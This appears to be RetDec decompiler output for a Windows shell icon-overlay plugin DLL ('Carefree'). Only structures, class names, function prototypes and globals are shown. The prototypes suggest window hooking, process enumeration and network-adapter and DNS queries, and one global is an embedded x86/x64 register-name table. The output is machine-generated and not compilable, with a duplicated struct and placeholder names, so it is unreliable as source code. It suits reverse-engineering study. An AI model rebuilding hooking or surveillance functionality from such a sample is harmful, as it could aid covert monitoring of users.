//
// This file was generated by the Retargetable Decompiler
// Website: https://retdec.com
// Copyright (c) Retargetable Decompiler <info@retdec.com>
//

#include <stdbool.h>
#include <stdint.h>
#include <stdlib.h>
#include <windows.h>

// ------------------------ Structures ------------------------

struct _EXCEPTION_RECORD {
    int32_t e0;
    int32_t e1;
    struct _EXCEPTION_RECORD * e2;
    int32_t * e3;
    int32_t e4;
    int32_t e5[1];
};

struct _FILETIME {
    int32_t e0;
    int32_t e1;
};

struct _IO_FILE {
    int32_t e0;
};

struct _LIST_ENTRY {
    struct _LIST_ENTRY * e0;
    struct _LIST_ENTRY * e1;
};

struct _LIST_ENTRY {
    struct _LIST_ENTRY * e0;
    struct _LIST_ENTRY * e1;
};

struct _M128A {
    int32_t e0;
    int64_t e1;
};

struct _CONTEXT {
    int32_t e0;
    int32_t e1;
    int32_t e2;
    int32_t e3;
    int32_t e4;
    int32_t e5;
    int32_t e6;
    int32_t e7;
    int16_t e8;
    int16_t e9;
    int16_t e10;
    int16_t e11;
    int16_t e12;
    int16_t e13;
    int32_t e14;
    int32_t e15;
    int32_t e16;
    int32_t e17;
    int32_t e18;
    int32_t e19;
    int32_t e20;
    int32_t e21;
    int32_t e22;
    int32_t e23;
    int32_t e24;
    int32_t e25;
    int32_t e26;
    int32_t e27;
    int32_t e28;
    int32_t e29;
    int32_t e30;
    int32_t e31;
    int32_t e32;
    int32_t e33;
    int32_t e34;
    int32_t e35;
    int32_t e36;
    int32_t e37;
    int32_t e38;
    struct _M128A e39[26];
    int32_t e40;
    int32_t e41;
    int32_t e42;
    int32_t e43;
    int32_t e44;
    int32_t e45;
};

struct _MEMORY_BASIC_INFORMATION {
    int32_t * e0;
    int32_t * e1;
    int32_t e2;
    int32_t e3;
    int32_t e4;
    int32_t e5;
    int32_t e6;
};

struct _RTL_CRITICAL_SECTION {
    struct _RTL_CRITICAL_SECTION_DEBUG * e0;
    int32_t e1;
    int32_t e2;
    int32_t * e3;
    int32_t * e4;
    int32_t e5;
};

struct _RTL_CRITICAL_SECTION_DEBUG {
    int16_t e0;
    int16_t e1;
    struct _RTL_CRITICAL_SECTION * e2;
    struct _LIST_ENTRY e3;
    int32_t e4;
    int32_t e5;
    int32_t e6;
    int16_t e7;
    int16_t e8;
};

struct _SECURITY_ATTRIBUTES {
    int32_t e0;
    int32_t * e1;
    bool e2;
};

struct _SYSTEM_INFO {
    int32_t e0;
    int32_t e1;
    int32_t * e2;
    int32_t * e3;
    int32_t e4;
    int32_t e5;
    int32_t e6;
    int32_t e7;
    int16_t e8;
    int16_t e9;
};

struct _TYPEDEF_IP_ADDRESS_STRING__PIP_ADDRESS_STRING_IP_MASK_STRING__PIP_MASK_STRING {
    char e0[1];
};

struct _IP_ADDR_STRING {
    struct _IP_ADDR_STRING * e0;
    struct _TYPEDEF_IP_ADDRESS_STRING__PIP_ADDRESS_STRING_IP_MASK_STRING__PIP_MASK_STRING e1;
    struct _TYPEDEF_IP_ADDRESS_STRING__PIP_ADDRESS_STRING_IP_MASK_STRING__PIP_MASK_STRING e2;
    int32_t e3;
};

struct _IP_ADAPTER_INFO {
    struct _IP_ADAPTER_INFO * e0;
    int32_t e1;
    char e2[1];
    char e3[1];
    int32_t e4;
    char e5[1];
    int32_t e6;
    int32_t e7;
    int32_t e8;
    struct _IP_ADDR_STRING * e9;
    struct _IP_ADDR_STRING e10;
    struct _IP_ADDR_STRING e11;
    struct _IP_ADDR_STRING e12;
    bool e13;
    struct _IP_ADDR_STRING e14;
    struct _IP_ADDR_STRING e15;
    int32_t e16;
    int32_t e17;
};

struct _WIN32_FIND_DATAW {
    int32_t e0;
    struct _FILETIME e1;
    struct _FILETIME e2;
    struct _FILETIME e3;
    int32_t e4;
    int32_t e5;
    int32_t e6;
    int32_t e7;
    int16_t e8[1];
    int16_t e9[14];
    int32_t e10;
    int32_t e11;
    int16_t e12;
};

struct __locale_data {
    int32_t e0;
};

struct __locale_struct {
    struct __locale_data * e0[13];
    int16_t * e1;
    int32_t * e2;
    int32_t * e3;
    char * e4[13];
};

struct tagPOINT {
    int32_t e0;
    int32_t e1;
};

struct tagMSG {
    int32_t * e0;
    int32_t e1;
    int32_t e2;
    int32_t e3;
    int32_t e4;
    struct tagPOINT e5;
};

struct tagPROCESSENTRY32W {
    int32_t e0;
    int32_t e1;
    int32_t e2;
    int32_t e3;
    int32_t e4;
    int32_t e5;
    int32_t e6;
    int32_t e7;
    int32_t e8;
    int16_t e9[1];
};

struct vtable_1002a654_type {
    int32_t (*e0)();
    int32_t (*e1)();
    int32_t (*e2)();
    int32_t (*e3)(int32_t, int32_t, int32_t);
    int32_t (*e4)(int32_t);
    int32_t (*e5)(char);
};

struct vtable_1002a6fc_type {
    int32_t (*e0)(int32_t, int32_t, int32_t);
    int32_t (*e1)(int32_t);
    int32_t (*e2)(int32_t);
    int32_t (*e3)(int32_t);
    int32_t (*e4)(int32_t, int32_t, int32_t);
    int32_t (*e5)(int32_t, int32_t, int32_t, int32_t, int32_t);
    int32_t (*e6)(int32_t, int32_t, int32_t, int32_t, int32_t, int32_t, int32_t, int32_t);
    int32_t (*e7)(char);
};

struct vtable_1002a7a0_type {
    int32_t (*e0)(int32_t);
    int32_t (*e1)(int32_t);
    int32_t (*e2)(int32_t);
    int32_t (*e3)();
    int32_t (*e4)();
    int32_t (*e5)(int32_t);
};

struct vtable_1002a7ec_type {
    int32_t (*e0)(int32_t, int32_t, int32_t);
    int32_t (*e1)(int32_t);
    int32_t (*e2)(int32_t);
    int32_t (*e3)(int32_t, int32_t, int32_t, int32_t);
    int32_t (*e4)(int32_t);
    int32_t (*e5)(char);
};

struct vtable_1002a830_type {
    int32_t (*e0)(int32_t, int32_t, int32_t);
    int32_t (*e1)(int32_t);
    int32_t (*e2)(int32_t);
    int32_t (*e3)(char);
};

struct vtable_1002ae3c_type {
    int32_t (*e0)(char);
    int32_t (*e1)(int32_t *);
    int32_t (*e2)(int32_t *);
    int32_t (*e3)();
    int32_t (*e4)(int32_t);
    int32_t (*e5)(int32_t);
};

struct vtable_1002b918_type {
    int32_t (*e0)(int32_t);
    int32_t (*e1)();
};

struct vtable_1002c800_type {
    int32_t (*e0)(int32_t);
    int32_t (*e1)();
};

// ------------------------- Classes --------------------------

// .?AUICarefreeIdentifier@@
// .?AUIClassFactory@@
// .?AUIDispatch@@
// .?AUIRegistrarBase@@
// .?AUIShellIconOverlayIdentifier@@
// .?AUIUnknown@@
// .?AU_ATL_MODULE70@ATL@@
// .?AV?$CAtlDllModuleT@VCCarefreePluginModule@@@ATL@@
// .?AV?$CAtlModuleT@VCCarefreePluginModule@@@ATL@@
// .?AV?$CComAggObject@VCCarefreeIdentifier@@@ATL@@ (base classes: .?AUIUnknown@@, .?AV?$CComObjectRootEx@VCComSingleThreadModel@ATL@@@ATL@@, .?AVCComObjectRootBase@ATL@@)
// .?AV?$CComCoClass@VCCarefreeIdentifier@@$1?CLSID_CarefreeIdentifier@@3U_GUID@@B@ATL@@
// .?AV?$CComContainedObject@VCCarefreeIdentifier@@@ATL@@ (base classes: .?AUIUnknown@@, .?AV?$CComObjectRootEx@VCComSingleThreadModel@ATL@@@ATL@@, .?AVCCarefreeIdentifier@@, .?AVCComObjectRootBase@ATL@@, .?AV?$CComCoClass@VCCarefreeIdentifier@@$1?CLSID_CarefreeIdentifier@@3U_GUID@@B@ATL@@, .?AUIShellIconOverlayIdentifier@@, .?AUIDispatch@@, .?AUICarefreeIdentifier@@, .?AV?$IDispatchImpl@UICarefreeIdentifier@@$1?IID_ICarefreeIdentifier@@3U_GUID@@B$1?LIBID_CarefreePluginLib@@3U3@B$00$0A@VCComTypeInfoHolder@ATL@@@ATL@@)
// .?AV?$CComObject@VCCarefreeIdentifier@@@ATL@@ (base classes: .?AUIUnknown@@, .?AV?$CComObjectRootEx@VCComSingleThreadModel@ATL@@@ATL@@, .?AVCCarefreeIdentifier@@, .?AVCComObjectRootBase@ATL@@, .?AV?$CComCoClass@VCCarefreeIdentifier@@$1?CLSID_CarefreeIdentifier@@3U_GUID@@B@ATL@@, .?AUIShellIconOverlayIdentifier@@, .?AUIDispatch@@, .?AUICarefreeIdentifier@@, .?AV?$IDispatchImpl@UICarefreeIdentifier@@$1?IID_ICarefreeIdentifier@@3U_GUID@@B$1?LIBID_CarefreePluginLib@@3U3@B$00$0A@VCComTypeInfoHolder@ATL@@@ATL@@)
// .?AV?$CComObjectCached@VCComClassFactory@ATL@@@ATL@@ (base classes: .?AUIUnknown@@, .?AVCComObjectRootBase@ATL@@, .?AV?$CComObjectRootEx@VCComMultiThreadModel@ATL@@@ATL@@, .?AUIClassFactory@@, .?AVCComClassFactory@ATL@@)
// .?AV?$CComObjectRootEx@VCComMultiThreadModel@ATL@@@ATL@@
// .?AV?$CComObjectRootEx@VCComSingleThreadModel@ATL@@@ATL@@
// .?AV?$IDispatchImpl@UICarefreeIdentifier@@$1?IID_ICarefreeIdentifier@@3U_GUID@@B$1?LIBID_CarefreePluginLib@@3U3@B$00$0A@VCComTypeInfoHolder@ATL@@@ATL@@
// .?AVCAtlModule@ATL@@
// .?AVCCarefreeIdentifier@@
// .?AVCCarefreePluginModule@@ (base classes: .?AU_ATL_MODULE70@ATL@@, .?AVCAtlModule@ATL@@, .?AV?$CAtlModuleT@VCCarefreePluginModule@@@ATL@@, .?AV?$CAtlDllModuleT@VCCarefreePluginModule@@@ATL@@)
// .?AVCComClassFactory@ATL@@
// .?AVCComObjectRootBase@ATL@@
// .?AVCRegObject@ATL@@ (base classes: .?AUIRegistrarBase@@, .?AUIUnknown@@)
// .?AVbad_alloc@std@@ (base classes: .?AVexception@std@@)
// .?AVexception@std@@
// .?AVtype_info@@

// ------------------- Function Prototypes --------------------

int32_t ??0_Init_locks@std@@QAE@XZ(void);
void ??__Finitlocks@@YAXXZ(void);
int32_t _3f__3f_0_Init_locks_40_std_40__40_QAE_40_XZ(void);
int32_t _3f__3f_1exception_40_std_40__40_UAE_40_XZ(void);
void _3f__3f_3_40_YAXPAX_40_Z(int32_t * a1);
void _3f__3f___Finitlocks_40__40_YAXXZ(void);
void _3f__CallMemberFunction0_40__40_YGXPAX0_40_Z(int32_t * result, int32_t * a2, int32_t * a3);
int32_t _40___security_check_cookie_40_4(void);
int32_t ___crtTlsAlloc_40_4(void);
int32_t * ___get_sigabrt(int32_t * Ptr);
int32_t ___iob_func(void);
int32_t __cexit(void);
int32_t __crt_debugger_hook(void);
int32_t * __encoded_null(int32_t * Ptr);
int32_t __flushall(void);
int32_t * __initp_eh_hooks(int32_t * Ptr);
int32_t __initp_heap_handler(int32_t result);
int32_t __initp_misc_invarg(int32_t result);
int32_t __initp_misc_purevirt(int32_t result);
int32_t __initp_misc_rand_s(int32_t result);
int32_t __lockexit(void);
int32_t __NLG_Call(void);
int32_t __NLG_Notify1(void);
int32_t __unlockexit(void);
int32_t _CallBack_40_12(int32_t nCode, int32_t wParam, int32_t lParam);
int32_t _DllMain_40_12(int32_t a1, int32_t a2);
int32_t _Init_40_16(int32_t a1);
void _RtlUnwind_40_16(int32_t * TargetFrame, int32_t * TargetIp, struct _EXCEPTION_RECORD * ExceptionRecord, int32_t * ReturnValue);
int32_t DllCanUnloadNow(void);
int32_t DllGetClassObject(int32_t a1, int32_t a2, int32_t a3);
int32_t DllInstall(int32_t a1, int32_t a2);
int32_t DllRegisterServer(void);
int32_t DllUnregisterServer(void);
int32_t function_10001000(int32_t a1, int32_t result);
int32_t function_10001030(int32_t a1);
int32_t function_10001050(int32_t a1, uint32_t a2, int32_t a3, uint32_t a4, int32_t a5);
int32_t function_10001150(int32_t * a1, int32_t a2, int32_t a3, int32_t a4);
int32_t function_100011d0(int32_t a1);
int32_t function_10001260(int32_t a1, int32_t a2, int32_t a3);
int32_t function_10001c80(int32_t a1, int32_t a2, int32_t a3);
int32_t function_10001d70(int32_t a1, int32_t a2, int32_t a3, int32_t a4);
int32_t function_10001e00(int32_t a1, int32_t a2, int32_t a3);
int32_t function_10001e40(int32_t a1, int32_t a2, int32_t a3);
int32_t function_10001e80(int32_t a1, int32_t a2, int32_t a3);
int32_t function_10001ec0(int32_t a1, int32_t a2, int32_t a3);
int32_t function_10001f00(int32_t a1, int32_t a2, int32_t a3);
int32_t function_10001f40(int32_t a1, int32_t a2, int32_t a3);
int32_t function_10001f80(void);
int32_t function_10001fa0(int32_t result, int32_t a2, int32_t a3, int32_t a4, int32_t a5);
int32_t function_100024c0(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6);
int32_t function_10002a90(int32_t a1, int32_t a2);
int32_t function_10002b30(int32_t a1);
int32_t function_10002c20(int32_t result2, int32_t a2, uint32_t a3, int32_t a4);
int32_t function_10003490(int32_t a1, int32_t a2, int32_t a3);
int32_t function_1000b7b0(int32_t a1, int32_t a2, int32_t a3);
int32_t function_1000ff40(void);
int32_t function_1000ff80(void);
int32_t function_1000ffc0(int32_t a1, int32_t a2);
int32_t function_100100d0(int32_t dwThreadId, uint32_t a2, int32_t a3);
int32_t function_100101e0(void);
int32_t function_10010270(int32_t a1);
int32_t function_100103f0(int32_t a1, uint32_t a2, int32_t a3);
int32_t function_100104d0(int32_t * a1, int32_t a2);
int32_t function_10010730(int32_t * a1);
int32_t function_10010880(int32_t a1, int32_t a2, int32_t lpString);
int32_t function_100108b0(int32_t a1);
int32_t function_100108d0(int32_t a1, int32_t a2, int32_t a3, int32_t a4);
int32_t function_10010990(int32_t a1, int32_t a2, int32_t a3, int32_t a4);
int32_t function_10010a50(void);
int32_t function_10010a80(void);
int32_t function_10010aa0(int32_t a1);
int32_t function_10010ac0(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6, int32_t a7, int32_t * a8, int32_t * a9, int32_t a10, int32_t a11, int32_t a12, int32_t a13);
int32_t function_10010b40(int32_t a1, int32_t a2, int32_t a3, int32_t a4);
int32_t function_10010ba0(int32_t a1, int32_t a2, int32_t a3);
int32_t function_10010c00(int32_t a1);
int32_t function_10010c80(void);
int32_t function_10010cb0(int32_t hKey, int32_t lpSubKey, int32_t lpClass, int32_t dwOptions, int32_t samDesired, int32_t lpSecurityAttributes, int32_t hKey2);
int32_t function_10010d50(int32_t hKey, int32_t lpSubKey, int32_t samDesired);
int32_t function_10010e00(int32_t lpValueName, int32_t a2);
int32_t function_10010e20(int32_t lpValueName, int32_t * lpString, int32_t hKey);
int32_t function_10010e60(int32_t a1, int32_t a2);
int32_t function_10010ec0(void);
void function_10010ef0(int32_t * pv);
int32_t function_10010f00(int32_t a1, int32_t a2);
int32_t function_10010fe0(int32_t * a1, int32_t * a2);
int32_t function_10011090(int32_t a1, int32_t a2);
int32_t function_10011110(int32_t result, int32_t a2);
int32_t function_10011160(void);
int32_t function_100111c0(int32_t a1);
int32_t function_10011330(int32_t a1);
int32_t function_10011370(int32_t hKey);
int32_t function_100113c0(int32_t a1);
int32_t function_10011430(void);
int32_t function_10011440(void);
void function_10011450(int16_t * bstrString);
int32_t function_10011460(void);
int32_t function_10011470(int32_t a1);
int32_t function_10011490(void);
int32_t function_100114a0(void);
int32_t function_100114c0(void);
int32_t function_100114d0(int32_t a1);
int32_t function_10011500(void);
int32_t function_10011520(int32_t a1);
int32_t function_10011670(int32_t a1);
int32_t function_10011770(int32_t a1);
int32_t function_10011790(void);
int32_t function_100117d0(int32_t * a1);
int32_t function_10011860(void);
int32_t function_10011870(void);
int32_t function_100118e0(void);
int32_t function_10011970(void);
int32_t function_10011980(void);
int32_t function_10011990(void);
int32_t function_100119a0(char a1);
int32_t function_10011a50(int32_t a1, int32_t a2);
int32_t function_10011d20(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5);
int32_t function_10011d60(int32_t result, int32_t a2, int32_t a3, int32_t a4);
int32_t function_10011dc0(int32_t a1);
int32_t function_10011df0(char a1);
int32_t function_10011e30(int32_t * a1, int32_t * a2);
int32_t function_10011eb0(int32_t a1);
int32_t function_10011f00(int32_t a1);
int32_t function_10011f50(uint32_t a1, int32_t a2, int32_t a3);
int32_t function_10011f90(int32_t a1, int32_t ** a2, int32_t a3, int32_t result, int32_t a5);
int32_t function_10012080(void);
int32_t function_100120a0(int32_t a1);
int32_t function_100120c0(int32_t a1);
int32_t function_100120d0(int32_t a1);
int32_t function_10012100(int32_t a1);
int32_t function_10012110(int32_t a1);
int32_t function_10012120(int32_t a1);
int32_t function_100122f0(int32_t a1);
int32_t function_10012350(void);
int32_t function_10012360(int32_t a1, int32_t a2, int32_t a3);
int32_t function_10012380(char a1);
int32_t function_100123c0(void);
int32_t function_100123e0(int32_t a1, int32_t a2, int32_t a3, int32_t a4);
int32_t function_10012470(int32_t a1);
int32_t function_10012480(int32_t a1, int32_t a2, int32_t a3, int32_t a4);
int32_t function_10012550(int32_t a1);
int32_t function_10012570(int32_t a1);
int32_t function_10012590(int32_t a1, int32_t a2, int32_t a3);
int32_t function_100125b0(int32_t a1);
int32_t function_100125c0(int32_t a1);
int32_t function_100125d0(int32_t a1);
int32_t function_100125e0(int32_t a1, int32_t a2, int32_t * a3);
int32_t function_10012640(int32_t a1, int32_t a2);
int32_t function_10012670(int32_t lpString, int32_t lpString2);
int32_t function_10012800(int32_t a1, int32_t a2, int32_t a3);
int32_t function_10012880(int32_t a1, int32_t a2, int32_t a3);
int32_t function_10012c00(int32_t a1, int32_t a2, int32_t a3, int32_t a4);
int32_t function_100133d0(int32_t a1, int32_t a2);
int32_t function_10013640(int32_t a1);
int32_t function_10013670(int32_t a1);
int32_t function_100136c0(int32_t a1, int32_t a2, int32_t a3);
int32_t function_100136e0(char a1);
int32_t function_10013720(int32_t a1, int32_t a2, int32_t a3, int32_t a4);
int32_t function_10013810(int32_t a1);
int32_t function_10013820(int32_t a1);
int32_t function_10013850(int32_t a1, int32_t a2, int32_t a3);
int32_t function_100138c0(char a1);
int32_t function_10013900(int32_t a1, int32_t a2);
int32_t function_10013aa0(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6);
int32_t function_10013bc0(int32_t a1, int32_t a2, int32_t a3);
int32_t function_10013c20(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5);
int32_t function_10013c50(int32_t result2, int32_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6, int32_t a7, int32_t a8);
int32_t function_10013cb0(int32_t a1, int32_t a2, int32_t a3);
int32_t function_10013dd0(int32_t a1, int32_t a2, int32_t a3, int32_t a4);
int32_t function_10013ec0(int32_t lpLibFileName, int32_t lpName, int32_t lpType, int32_t a4, int32_t a5);
int32_t function_10014060(int32_t a1, int32_t a2, int32_t a3, int32_t a4);
int32_t function_100140c0(int32_t a1, int32_t a2, int32_t a3, int32_t a4);
int32_t function_10014120(int32_t a1, int32_t a2, int32_t a3, int32_t a4);
int32_t function_10014350(int32_t a1);
int32_t function_10014370(int32_t a1, int32_t a2, int32_t a3);
int32_t function_100143a0(int32_t a1, int32_t a2);
int32_t function_10014410(int32_t a1, int32_t a2, int32_t a3);
int32_t function_100144c0(int32_t a1, int32_t a2, int32_t a3);
int32_t function_10014570(void);
int32_t function_100145b0(int32_t a1);
int32_t function_10014600(int32_t hModule, int32_t lpString, int32_t * a3, int32_t * a4, int32_t a5, int32_t a6, int32_t a7, int32_t a8);
int32_t function_10014800(int32_t a1, int32_t a2, int32_t a3);
int32_t function_10014b10(int32_t a1, int32_t a2);
int32_t function_10014bd0(int32_t a1, int32_t a2);
int32_t function_10014d10(int32_t * a1, int32_t a2, int32_t a3);
int32_t function_10014da0(int32_t * a1, int32_t a2, int32_t a3);
int32_t function_10014e30(int32_t * a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5);
int32_t function_10014f70(int32_t a1);
int32_t function_10015000(int32_t a1);
int32_t function_10015100(int32_t nNumberOfArguments);
int32_t function_10015150(void);
int32_t function_100152b0(void);
int32_t function_10015300(int32_t a1);
int32_t function_10015600(int32_t a1, int32_t a2);
int32_t function_10015700(void);
int32_t function_10015760(void);
int32_t function_100157d0(int32_t * Addend);
int32_t function_100157e0(int32_t * Addend);
int32_t function_100157f0(void);
int32_t function_10015800(int32_t a1);
int32_t function_10015860(int32_t result);
int32_t function_10015880(char a1);
int32_t function_100158b0(void);
int32_t function_10015a20(void);
int32_t function_10015d30(void);
int32_t function_10016210(int32_t a1);
int32_t function_10016370(void);
int32_t function_100163d0(void);
int32_t function_100167b0(int32_t a1);
int32_t function_10016810(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6, int32_t a7, int32_t a8, int32_t a9, int32_t a10);
int32_t function_10016a70(void);
int32_t function_10016aa0(int32_t a1);
int32_t function_10016ad0(int32_t a1, char * a2);
int32_t function_10016bd0(int32_t a1, uint32_t a2);
int32_t function_10016fd0(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6, int32_t a7, int32_t a8, int32_t a9, int32_t a10);
int32_t function_10017250(void);
int32_t function_100174a0(void);
int32_t function_100174d0(void);
int32_t function_10017510(int32_t lpWideCharStr, int32_t a2);
int32_t function_10017670(void);
int32_t function_10017850(int32_t a1, int32_t a2, int32_t a3);
int32_t function_10017990(int32_t a1, int32_t a2);
int32_t function_100179f0(int32_t a1, int32_t a2);
int32_t function_10017aa0(int32_t a1, int32_t a2, int32_t a3, int32_t a4);
int32_t function_10017b60(int32_t a1);
int32_t function_10017ba0(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6, int32_t a7);
int32_t function_10017ca0(int32_t * a1, int32_t * a2, int32_t * a3, uint32_t a4, int32_t a5);
int32_t function_10017f94(int32_t a1);
int32_t function_100180f0(int32_t * a1, char * a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6, int32_t a7, int32_t a8);
int32_t function_10018110(void);
int32_t function_100181e0(int32_t * a1, int32_t * a2);
int32_t function_100182c0(int32_t lpWideCharStr, int32_t lpWideCharStr2);
int32_t function_10018390(void);
int32_t function_10018660(int32_t a1);
int32_t function_10018870(void);
int32_t function_10018930(void);
int32_t function_100189b0(int16_t * a1);
int32_t function_10018ae0(int32_t lpData);
int32_t function_10018cb0(int32_t a1, int32_t * a2);
int32_t function_10018d30(int32_t a1, int32_t a2);
int32_t function_10018f70(int32_t result, int32_t a2);
int32_t function_10018f90(int32_t result, int32_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6);
int32_t function_10018fb0(int32_t * a1, int32_t a2);
bool function_10018fca(int32_t * hSnapshot, struct tagPROCESSENTRY32W * lppe);
bool function_10018fd0(int32_t * hSnapshot, struct tagPROCESSENTRY32W * lppe);
int32_t * function_10018fd6(int32_t dwFlags, int32_t th32ProcessID);
int32_t function_1001981d(void);
int32_t function_10019998(void);
int32_t function_100199c7(void);
int32_t function_10019a19(void);
int32_t function_1001a300(int32_t a1);
int32_t function_1001a6db(void);
int32_t function_1001a713(int32_t a1);
int32_t function_1001a94c(void);
int32_t function_1001a94f(int32_t a1);
int32_t function_1001ab73(void);
int32_t function_1001ac70(void);
int32_t function_1001ac88(int32_t a1, int32_t a2, int32_t * a3);
int32_t function_1001ac93(void);
int32_t function_1001b12b(void);
int32_t function_1001b170(int32_t result, int16_t * a2);
int32_t function_1001c0e8(void);
int32_t function_1001c0fc(void);
int32_t function_1001c70b(void);
int32_t function_1001c801(void);
int32_t function_1001cacd(void);
int32_t function_1001cadc(void);
int32_t function_1001caf3(int32_t a1);
int32_t function_1001cb03(void);
int32_t function_1001ccee(void);
int32_t function_1001ccfd(void);
int32_t function_1001cd01(int32_t a1);
int32_t function_1001e792(void);
int32_t function_1001e891(void);
int32_t function_1001ea0a(void);
int32_t function_1001ee50(void);
int32_t function_1001f24c(void);
int32_t function_1001f61b(void);
int32_t function_1001f624(void);
int32_t function_1001f99f(void);
int32_t function_1001fad0(void);
int32_t function_1001fad9(void);
int32_t function_1001fc8f(void);
int32_t function_1001fc9b(void);
int32_t function_100202f7(void);
int32_t function_10020388(void);
int32_t function_1002052a(void);
int32_t function_100205cc(void);
int32_t function_100206aa(void);
int32_t function_1002075b(int32_t * a1);
int32_t function_10020764(void);
int32_t function_100207ca(void);
int32_t function_100207e6(void);
int32_t function_100207f1(void);
int32_t function_10020a6b(void);
int32_t function_10021098(void);
int32_t function_10021258(void);
int32_t function_10022156(int32_t a1);
int32_t function_100227e6(void);
int32_t function_100248ef(void);
int32_t function_10024edf(void);
int32_t function_1002506a(void);
int32_t function_10025880(int32_t a1, int32_t a2);
int32_t function_10025aef(void);
int32_t function_10025af6(int32_t a1);
int32_t function_10025c86(void);
int32_t function_100260e1(void);
int32_t function_100260e3(void);
int32_t function_10026100(int32_t a1);
int32_t function_10026125(void);
int32_t function_10026127(void);
int32_t function_1002617d(void);
int32_t function_1002617f(void);
int32_t function_100261c1(int32_t a1);
void function_1002621c(int32_t * pData, int32_t FreeType);
int32_t function_10026222(char * pszName, int16_t wType, int32_t Options, int32_t * pExtra, int32_t * ppQueryResults, int32_t ** pReserved);
int32_t function_10026228(struct _IP_ADAPTER_INFO * AdapterInfo, int32_t * SizePointer);
int32_t function_10026530(void);
int32_t function_10026560(void);
int32_t function_10026590(void);
int32_t function_1002659b(void);
int32_t function_100265c0(void);
int32_t function_100265f0(void);
int32_t function_100265fb(void);
int32_t function_10026620(void);
int32_t function_10026650(void);
int32_t function_10026658(void);
int32_t function_10026680(void);
int32_t function_100266b0(void);
int32_t function_100266bb(void);
int32_t function_100266c6(int32_t a1);
int32_t function_100266f0(void);
int32_t function_100266fb(void);
int32_t function_10026706(int32_t a1);
int32_t function_10026730(void);
int32_t function_1002673b(void);
int32_t function_10026746(void);
int32_t function_10026751(void);
int32_t function_1002675c(int32_t a1);
int32_t function_100267d0(void);
int32_t function_10026800(void);
int32_t function_1002680b(void);
int32_t function_10026816(int32_t a1);
int32_t function_10026840(void);
int32_t function_10026880(void);
int32_t function_100268a0(void);
int32_t function_100268c0(void);
int32_t function_100268e0(void);
int32_t function_10026900(void);
int32_t function_10026940(void);
int32_t function_12493aab(void);

// --------------------- Global Variables ---------------------

char * g1; // 0x1001446c
char * g2; // 0x1001451c
char * g3 = "0"; // 0x100273cc
int32_t g4 = 10; // 0x10028d00
int32_t g5 = 0x12341234; // 0x1002a290
int32_t g6 = 66; // 0x1002a3c0
int32_t g7 = 68; // 0x1002a3c4
int32_t g8 = 77; // 0x1002a3c8
int32_t g9 = 83; // 0x1002a3cc
int32_t g10; // 0x1002a3f0
int32_t g12 = 0x1001ab8b; // 0x1002a6c4
int32_t g13 = 0x10012470; // 0x1002a6e0
int32_t g16 = 0x45615f2e; // 0x1002a74c
int32_t g17 = 0x20412; // 0x1002a77c
int32_t g19 = 0x10012590; // 0x1002a7bc
int32_t g22 = 1; // 0x1002a81c
int32_t g24 = 0x2e012; // 0x1002a968
int32_t g26 = 326; // 0x1002ae54
int16_t * g27 = (int16_t *)46; // 0x1002aed4
int16_t * g28 = (int16_t *)44; // 0x1002b048
int16_t * g29 = (int16_t *)34; // 0x1002b168
int16_t * g30 = (int16_t *)61; // 0x1002b298
int16_t * g31 = NULL; // 0x1002b2b8
int32_t g32 = 0x75690000; // 0x1002b372
int32_t g33 = 0x214f9; // 0x1002b624
int32_t g34 = 0x2e005; // 0x1002b634
int32_t g35 = 803; // 0x1002b654
int32_t g36 = 267; // 0x1002b664
int32_t g37 = 0x21401; // 0x1002b674
int32_t g39 = 0x10020393; // 0x1002c7e4
int32_t g41 = 0x5dc0a9ca; // 0x1002d87c
int32_t g42 = 0; // 0x1002e1e8
int32_t g44 = 0; // 0x1002ecac
int32_t g45 = 1; // 0x10030000
char * g46[96] = {
    "es",
    "cs",
    "ss",
    "ds",
    "fs",
    "gs",
    "ERROR",
    "ERROR",
    "al",
    "cl",
    "dl",
    "bl",
    "ah",
    "ch",
    "dh",
    "bh",
    "ax",
    "cx",
    "dx",
    "bx",
    "sp",
    "bp",
    "si",
    "di",
    "eax",
    "ecx",
    "edx",
    "ebx",
    "esp",
    "ebp",
    "esi",
    "edi",
    "al",
    "cl",
    "dl",
    "bl",
    "spl",
    "bpl",
    "sil",
    "dil",
    "r8b",
    "r9b",
    "r10b",
    "r11b",
    "r12b",
    "r13b",
    "r14b",
    "r15b",
    "ax",
    "cx",
    "dx",
    "bx",
    "sp",
    "bp",
    "si",
    "di",
    "r8w",
    "r9w",
    "r10w",
    "r11w",
    "r12w",
    "r13w",
    "r14w",
    "r15w",
    "eax",
    "ecx",
    "edx",
    "ebx",
    "esp",
    "ebp",
    "esi",
    "edi",
    "r8d",
    "r9d",
    "r10d",
    "r11d",
    "r12d",
    "r13d",
    "r14d",
    "r15d",
    "rax",
    "rcx",
    "rdx",
    "rbx",
    "rsp",
    "rbp",
    "rsi",
    "rdi",
    "r8",
    "r9",
    "r10",
    "r11",
    "r12",
    "r13",
    "r14",
    "r15"
}; // 0x10030100
char * g47[9] = {
    "byte ptr",
    "word ptr",
    "dword ptr",
    "6_byte ptr",
    "qword ptr",
    "10_byte ptr",
    "INVALID PTR",
    "INVALID PTR",
    "oword ptr"
}; // 0x10030280
int32_t g48 = 0; // 0x100302f0
int32_t g49 = 0; // 0x100340a0
int32_t g51 = 0; // 0x100386a8
char * g52; // 0x10045ad0
int32_t g53 = 514; // 0x10045ad8
int32_t g54 = 0; // 0x1004a290
int32_t g55 = 0; // 0x1004a298
int32_t g56 = 0; // 0x1004da90
int32_t g57 = 0; // 0x10051290
char * g58 = "\x01\x01\x01\x01"; // 0x10054a90
char * g59 = "\x01\x01\x01\x01"; // 0x10054b90
char * g60 = "\x01\x01\x01\x01"; // 0x10054d90
char * g61; // 0x10054e90
int32_t g62 = 0; // 0x10054f88
char * g63; // 0x10055018
char * g64 = "\x06\a"; // 0x10055118
